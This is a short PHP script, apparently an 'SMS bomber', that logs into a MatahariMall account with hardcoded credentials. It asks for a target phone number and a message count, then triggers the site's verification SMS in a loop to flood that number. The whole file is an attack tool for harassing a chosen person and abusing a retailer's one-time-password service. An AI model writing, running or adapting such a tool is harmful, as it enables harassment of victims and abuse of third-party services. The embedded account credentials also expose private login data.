<?php
/*
    https://github.com/nee48/bomsmsmthrmall/
    Made by Handika Pratama
    Modified by まやちゃん
    Modified Again by 
*/

include 'bommthrml.php';

$init = new Bom();
//Configuration Account MatahariMall
$init->email = "zumupolij@c1oramn.com";
$init->pass = "Hilih kintil";
$init->Login($init->email,$init->pass);

echo "Target Number (use country code): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Number of Messages: ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
